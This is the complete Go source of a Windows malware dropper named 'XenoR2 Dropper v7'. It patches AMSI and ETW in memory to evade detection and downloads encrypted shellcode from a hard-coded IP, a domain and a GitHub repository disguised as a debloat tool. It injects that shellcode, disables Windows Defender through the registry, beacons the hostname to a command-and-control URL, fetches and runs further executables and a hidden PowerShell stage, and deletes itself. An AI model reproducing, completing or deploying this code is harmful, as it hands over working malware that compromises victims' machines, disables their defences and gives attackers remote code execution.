// XenoR2 Dropper v7 — native Go, no PowerShell on cmdline
// Build: go build -ldflags "-s -w -H windowsgui" -o d.exe
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

var (
	k32    = syscall.NewLazyDLL("kernel32.dll")
	pVAl   = k32.NewProc("VirtualAlloc")
	pVP    = k32.NewProc("VirtualProtect")
	pCT    = k32.NewProc("CreateThread")
	pRM    = k32.NewProc("RtlMoveMemory")
	pSl    = k32.NewProc("Sleep")
	pGPA   = k32.NewProc("GetProcAddress")
	pLLA   = k32.NewProc("LoadLibraryA")
)

func patchOne(dllName, funcName string) {
	d := syscall.MustLoadDLL(dllName)
	a, _, _ := pGPA.Call(uintptr(d.Handle), uintptr(unsafe.Pointer(&[]byte(funcName+"\x00")[0])))
	if a == 0 {
		return
	}
	p := []byte{0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3}
	var o uint32
	pVP.Call(a, 6, 0x40, uintptr(unsafe.Pointer(&o)))
	pRM.Call(a, uintptr(unsafe.Pointer(&p[0])), 6)
	pVP.Call(a, 6, uintptr(o), uintptr(unsafe.Pointer(&o)))
}

func patchAMSI()  { patchOne("amsi.dll", "AmsiScanBuffer") }
func patchETW()   { patchOne("ntdll.dll", "EtwEventWrite") }

func aesDec(raw []byte, kb string) ([]byte, error) {
	kv, _ := base64.StdEncoding.DecodeString(kb)
	if len(kv) < 48 {
		return nil, fmt.Errorf("short key")
	}
	b, _ := aes.NewCipher(kv[:32])
	m := cipher.NewCBCDecrypter(b, kv[32:48])
	out := make([]byte, len(raw))
	m.CryptBlocks(out, raw)
	if n := int(out[len(out)-1]); n > 0 && n <= 16 {
		out = out[:len(out)-n]
	}
	return out, nil
}

func inject(sc []byte) {
	a, _, _ := pVAl.Call(0, uintptr(len(sc)), 0x3000, 0x40)
	if a == 0 {
		return
	}
	pRM.Call(a, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	var t uint32
	pCT.Call(0, 0, a, 0, 0, uintptr(unsafe.Pointer(&t)))
}

func dl(url string) ([]byte, error) {
	c := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}, Timeout: 30 * time.Second}
	r, _ := http.NewRequest("GET", url, nil)
	if r != nil {
		r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	}
	resp, err := c.Do(r)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func dlTry(path string) ([]byte, error) {
	for _, b := range []string{
		"https://193.26.115.196/",
		"https://signindat.com/",
		"https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers/",
	} {
		d, err := dl(b + path)
		if err == nil && len(d) > 0 {
			return d, nil
		}
	}
	return nil, fmt.Errorf("all fail")
}

func dlAes(path, key string) ([]byte, error) {
	raw, err := dlTry(path)
	if err != nil {
		return nil, err
	}
	return aesDec(raw, key)
}

func cb(stage, status, detail string) {
	h, _ := os.Hostname()
	body, _ := json.Marshal(map[string]string{"hostname": h, "stage": stage, "status": status, "detail": detail})
	c := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}, Timeout: 10 * time.Second}
	r, _ := http.NewRequest("POST", "https://signindat.com/cb.php", nil)
	if r != nil {
		r.Header.Set("Content-Type", "application/json")
		r.Body = io.NopCloser(newR(string(body)))
		c.Do(r)
	}
}

type rdr struct{ s string; i int }

func newR(s string) *rdr { return &rdr{s: s} }
func (r *rdr) Read(b []byte) (int, error) {
	if r.i >= len(r.s) {
		return 0, io.EOF
	}
	n := copy(b, r.s[r.i:])
	r.i += n
	return n, nil
}

func killDef() {
	exec.Command("reg", "add", `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`, "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f").Run()
	exec.Command("reg", "add", `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`, "/v", "DisableRealtimeMonitoring", "/t", "REG_DWORD", "/d", "1", "/f").Run()
}

func runExe(name string, args ...string) {
	tmp := filepath.Join(os.Getenv("TEMP"), name)
	d, err := dlTry(name)
	if err != nil || len(d) == 0 {
		return
	}
	os.WriteFile(tmp, d, 0644)
	defer os.Remove(tmp)
	c := exec.Command(tmp, args...)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	c.Start()
}

func runPS(name string) {
	tmp := filepath.Join(os.Getenv("TEMP"), name)
	d, err := dlTry(name)
	if err != nil || len(d) < 100 {
		return
	}
	os.WriteFile(tmp, d, 0644)
	c := exec.Command("powershell.exe", "-ep", "bypass", "-w", "hidden", "-File", tmp)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	c.Start()
}

func main() {
	patchAMSI()
	patchETW()

	sc, _ := dlAes("raw/ElevatorShellCode.exe.aes", "8XuttOXcFiQT+aOlVxneccVpq3mAugc5b7D3caLIVkbiFegb1/cCA2RAyIhtQult")
	if len(sc) > 0 {
		inject(sc)
	}
	pSl.Call(8000)

	killDef()
	cb("S2", "ok", "defender disabled")

	runExe("update.exe", "kill")
	pSl.Call(5000)

	runPS("stage_v6_pulsaar.ps1")
	cb("S9", "ok", "done")

	os.Remove(os.Args[0])
}
